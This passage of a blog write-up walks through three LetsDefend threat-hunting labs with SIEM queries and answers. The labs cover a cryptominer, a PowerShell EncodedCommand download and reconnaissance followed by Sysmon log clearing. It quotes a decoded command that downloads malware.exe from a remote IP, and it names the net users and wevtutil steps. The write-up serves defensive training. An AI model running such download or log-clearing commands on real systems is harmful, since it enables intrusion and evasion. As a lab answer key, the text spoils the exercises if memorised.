+<li>EDR Events (Sysmon)</li>
+<li>CTI Events (<a href="https://app.letsdefend.io/threath-intelligence-feed"  class="external-link" target="_blank" rel="noopener">Threat Intel — LetsDefend</a>)</li>
+<li>System Monitor Logs (Zabbix)</li>
+</ul>
+<h3 id="questions-4">
+  Questions
+  <a class="heading-link" href="#questions-4">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<blockquote>
+<p>According to System Monitor (Zabbix) logs, what is the hostname of the system that triggered a high CPU usage alert between Aug 1, 2024 00:00 — Aug 7, 2024 00:00?</p>
+</blockquote>
+<p>Filter for “rule.groups: zabbix” filter in the SIEM and search for “*cpu*”.</p>
+<p><img src="/images/1_3XXZOx1SwAw6SqmFxfRuSA.png" alt=""></p>
+<p><strong>Answer:</strong> app-server-01</p>
+<blockquote>
+<p>What is the name of the application installed on the high-CPU system during Aug 1–7, 2024? <strong>Answer Format</strong>: Test Tester: Winrar &amp; 7zip Extract Software</p>
+</blockquote>
+<p>Use the SIEM filters “rule.groups: windows_application” and “data.win.system.eventID: 1033”.</p>
+<p><img src="/images/1_UilugAhpPsrqAuSxol_uLw.png" alt=""></p>
+<p><strong>Answer:</strong> Cudo Miner: Bitcoin &amp; Crypto Mining Software (Miner.exe)</p>
+<blockquote>
+<p>What is the full path of the mining executable? <strong>Answer Format:</strong> C:\Temp\LetsDefend\Uploads\tester.exe</p>
+</blockquote>
+<p>Filter for “rule.groups: sysmon_event1” and search for “*miner.exe*” in the SIEM.</p>
+<p><img src="/images/1_5Ar2-l-iarkVmS0CMmArJA.png" alt=""></p>
+<p><strong>Answer:</strong> C:\Users\Admin\Downloads\miner.exe</p>
+<blockquote>
+<p>What is the parent process that executed the miner downloaded to the system?</p>
+</blockquote>
+<p>Filter for “rule.groups: sysmon_event1” and search for “*miner.exe*” in the SIEM.</p>
+<p><img src="/images/1_YkPvi0Kk6UfV6yz9xrpMqQ.png" alt=""></p>
+<p><strong>Answer:</strong> C:\Windows\bitsadmin.exe</p>
+<blockquote>
+<p>Which domain did the miner contact?</p>
+</blockquote>
+<p>Search for “data.win.eventdata.image: [Executable_Full_Path]” in the SIEM.</p>
+<p><img src="/images/1_h5b-t0TXCZ4xbTL3im9VXQ.png" alt=""></p>
+<p><strong>Answer:</strong> account.cryptominer.io</p>
+<blockquote>
+<p>Which threat group is this domain IOC associated with in LetsDefend Threat Intel?</p>
+</blockquote>
+<p>Look for the domain in the LetsDefend “Threat Intel” module.</p>
+<p><img src="/images/1_aDrZ5FZoEOW6IPXYknQXPQ.png" alt=""></p>
+<p><strong>Answer:</strong> RiverChildren</p>
+<blockquote>
+<p>According to the “Threat Intel” module on LetsDefend, what is the shared hash associated with this threat group?</p>
+</blockquote>
+<p>Look up the group name in the “Threat Intel” module on Letsdefend.</p>
+<p><img src="/images/1_q-oXm5FdiSKDhUNDr_gFyg.png" alt=""></p>
+<p><strong>Answer:</strong> 514CF877644F22924DA63989F3B56CD9</p>
+<blockquote>
+<p>According to the LetsDefend “Threat Intel” module, the hash associated with the threat actor group was detected on another system besides the one that generated the high CPU usage alert. What is the “agent_name” of this additional system?</p>
+</blockquote>
+<p>Query the hash obtained from the threat intelligence source in the SIEM search section. (“*hash*”)</p>
+<p><img src="/images/1_jVlUgh8rUf6i-1ZJuk_Vlg.png" alt=""></p>
+<p><strong>Answer:</strong> app-server-02</p>
+<blockquote>
+<p>What is the full path of the miner application running on the system where the cryptomining malware was detected (other than the system that generated the high CPU usage alert)?</p>
+</blockquote>
+<p>Query the hash obtained from the threat intelligence source in the SIEM search section. (“*hash*”)</p>
+<p><strong>Answer:</strong> C:\Windows\Temp\nanominer\nanominer.exe</p>
+<blockquote>
+<p>What is the full path of the process (parent process — path/binary_name) that executed the miner application on the system where cryptomining malware was detected (other than the system that generated the high CPU usage alert)?</p>
+</blockquote>
+<p><img src="/images/1_Aq1Q7mXyXVYkh0A8y9ECfQ.png" alt=""></p>
+<p><strong>Answer:</strong> C:\Windows\w3wp.EXE</p>
+<hr>
+<h3 id="practical-lab-2">
+  Practical Lab-2
+  <a class="heading-link" href="#practical-lab-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="hypothesis-2">
+  Hypothesis-2
+  <a class="heading-link" href="#hypothesis-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><strong>Note</strong>: The following questions are provided for the threat hunting process to test the following hypothesis.</p>
+<p><strong>Hypothesis</strong>: A group of threat actors may be executing malicious commands on our systems using PowerShell’s “Encoded Command Execution” techniques, potentially compromising system integrity.</p>
+<h3 id="threat-hunting-lab-environment-1">
+  Threat Hunting Lab Environment
+  <a class="heading-link" href="#threat-hunting-lab-environment-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li>SIEM (Wazuh)</li>
+<li>EDR Events (Sysmon)</li>
+<li>CTI Events (<a href="https://app.letsdefend.io/threath-intelligence-feed"  class="external-link" target="_blank" rel="noopener">Threat Intel — LetsDefend</a>)</li>
+<li>System Monitor Logs (Zabbix)</li>
+</ul>
+<h3 id="questions-5">
+  Questions
+  <a class="heading-link" href="#questions-5">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<blockquote>
+<p>What is the IP address (agent_ip) of the endpoint where PowerShell was used with the “EncodedCommand” parameter between Aug 1, 2024 00:00 — Aug 7, 2024 00:00?</p>
+</blockquote>
+<p>Filter for “rule.groups: sysmon_event1” and query “*powershell.exe*”.</p>
+<p><img src="/images/1_nmD3JCqmGqemuY_j1wo4cQ.png" alt=""></p>
+<p><strong>Answer:</strong> 192.168.100.25</p>
+<blockquote>
+<p>What is the decoded version of the command executed with the “EncodedCommand” parameter in PowerShell between Aug 1, 2024 00:00 — Aug 7, 2024 00:00?</p>
+</blockquote>
+<p><strong>Answer Format:</strong> I….-W…. -.. “http://x.x.x.x/x.exe&quot; -O… “C:\a\b\c.exe”</p>
+<p>Filter for “rule.groups: sysmon_event1” in the SIEM and query “powershell.exe”. Decode the base64 encoded data in the results.</p>
+<p><img src="/images/1_AHgZqcqDiE07Sc_DLhimkg.png" alt=""></p>
+<p><strong>Answer:</strong> Invoke-WebRequest -Uri “<a href="http://12.68.1.100/malware.exe"  class="external-link" target="_blank" rel="noopener">http://12.68.1.100/malware.exe</a>&quot; -OutFile “C:\Windows\Temp\malware.exe”</p>
+<blockquote>
+<p>To which group is the C&amp;C IP address in the command executed with PowerShell’s “EncodedCommand” parameter (between Aug 1–7, 2024) attributed in the LetsDefend Threat Intel module?</p>
+</blockquote>
+<p>Look for the detected IP address in the LetsDefend “Threat Intel” module.</p>
+<p><img src="/images/1_2kJbxr78bwxDFmuwtDBgGQ.png" alt=""></p>
+<p><strong>Answer:</strong> APT-SKR-41</p>
+<blockquote>
+<p>What is the hash among the IoCs associated with the group linked to the C&amp;C IP address (from the PowerShell “EncodedCommand” executed Aug 1–7, 2024) in the LetsDefend “Threat Intel” module?</p>
+</blockquote>
+<p>Look for the threat actor group name in the LetsDefend “Threat Intel” module and find the hash.</p>
+<p><img src="/images/1_W_vLzYYCtZuTThYeLKXoUA.png" alt=""></p>
+<p><strong>Answer:</strong> 1230FB982C1A8DCBDF232BE450E124A34439D67</p>
+<blockquote>
+<p>What is the full path of the executable for the parent process of the hash (among the IoCs associated with the group linked to the C&amp;C IP address from the PowerShell “EncodedCommand”)?</p>
+</blockquote>
+<p>Filter for the “rule.groups: sysmon_event1” in the SIEM and query the detected hash in the search section. (“*hash*”)</p>
+<p><img src="/images/1_LGi-PgTQKA6Yr2YqTD_kLw.png" alt=""></p>
+<p><strong>Answer:</strong> C:\Windows\explorer.exe</p>
+<blockquote>
+<p>Which IP address did the process (associated with the hash from the IoCs linked to the C&amp;C IP address) communicate with between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: sysmon_event3” in SIEM and query the executable name in the search section. (“*malware.exe*”)</p>
+<p><img src="/images/1_07pki_rB5OhXgBI7lgHZrg.png" alt=""></p>
+<p><strong>Answer:</strong> 185.220.101.24</p>
+<blockquote>
+<p>What was the firewall action for the IP address that the process (associated with the hash from the IoCs linked to the C&amp;C IP address) attempted to communicate with between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: firewall” and “data.dstip: ‘[IP Address]’” in the SIEM.</p>
+<p><img src="/images/1_kPQtjjXCclZO5q0skqNp4g.png" alt=""></p>
+<p><strong>Answer:</strong> deny</p>
+<hr>
+<h3 id="practical-lab-3">
+  Practical Lab-3
+  <a class="heading-link" href="#practical-lab-3">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="hypothesis-3">
+  Hypothesis-3
+  <a class="heading-link" href="#hypothesis-3">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><strong>Note</strong>: The following questions are provided for the threat hunting process to test the following hypothesis.</p>
+<p><strong>Hypothesis:</strong> An attacker may be conducting reconnaissance activities (both endpoint and domain-level) from a compromised endpoint, and may have deleted associated log entries to cover their tracks.</p>
+<h3 id="threat-hunting-lab-environment-2">
+  Threat Hunting Lab Environment
+  <a class="heading-link" href="#threat-hunting-lab-environment-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li>SIEM (Wazuh)</li>
+<li>EDR Events (Sysmon)</li>
+</ul>
+<h3 id="questions-6">
+  Questions
+  <a class="heading-link" href="#questions-6">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<blockquote>
+<p>What is the agent IP address of the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1087.001” in the SIEM.</p>
+<p><img src="/images/1_6km9iPo9NMNPawSuicbDqw.png" alt=""></p>
+<p><strong>Answer:</strong> 172.16.8.159</p>
+<blockquote>
+<p>What command was executed to discover local accounts on the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1087.001” in the SIEM.</p>
+<p><strong>Answer:</strong> net users</p>
+<blockquote>
+<p>Which domain group was discovered from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1087.002” in the SIEM.</p>
+<p><img src="/images/1_03A8IZBh_ySfZJe65LODXQ.png" alt=""></p>
+<p><strong>Answer:</strong> Domain Admins</p>
+<blockquote>
+<p>For which domain name was the Domain Controller list enumerated from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1018” in the SIEM.</p>
+<p><img src="/images/1_wzuDrn9Ah-xvXS9T686T6Q.png" alt=""></p>
+<p><strong>Answer:</strong> lab19.local</p>
+<blockquote>
+<p>Which Windows executable (originalFileName) was used for the “Remote System Discovery” MITRE technique to list Domain Controllers from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1018” in the SIEM.</p>
+<p><strong>Answer:</strong> nltestrk.exe</p>
+<blockquote>
+<p>What is the MITRE technique ID used to discover the internet egress IP address from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.technique: Remote System Discovery” in the SIEM. We see ping scan.</p>
+<p><strong>Answer:</strong> T1018</p>
+<blockquote>
+<p>Which URL was accessed to determine the internet egress IP address from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.technique: Remote System Discovery” in the SIEM.</p>
+<p><img src="/images/1_dRKjRtXJ3hMzieRWxvEIKg.png" alt=""></p>
+<p><strong>Answer:</strong> ifconfig.me</p>
+<blockquote>
+<p>Which logs were deleted from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”?</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1070.001” in the SIEM.</p>
+<p><img src="/images/1_rMmzpEBfRODLUdbo9X-CWw.png" alt=""></p>
+<p><strong>Answer:</strong> Microsoft-Windows-Sysmon/Operational</p>
+<blockquote>
+<p>Which executable (originalFileName) was used to delete logs from the Windows system where “T1087.001 — Account Discovery: Local Account” activity occurred between “Aug 1, 2024 00:00 — Aug 7, 2024 00:00”? Answer Format: net1.exe</p>
+</blockquote>
+<p>Filter for “rule.groups: windows” and “rule.mitre.id: T1070.001” in the SIEM.</p>
+<p><strong>Answer:</strong> wevtutil.exe</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Talha ARABACI 
+    ·
+    
+    Site program altyapısı <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
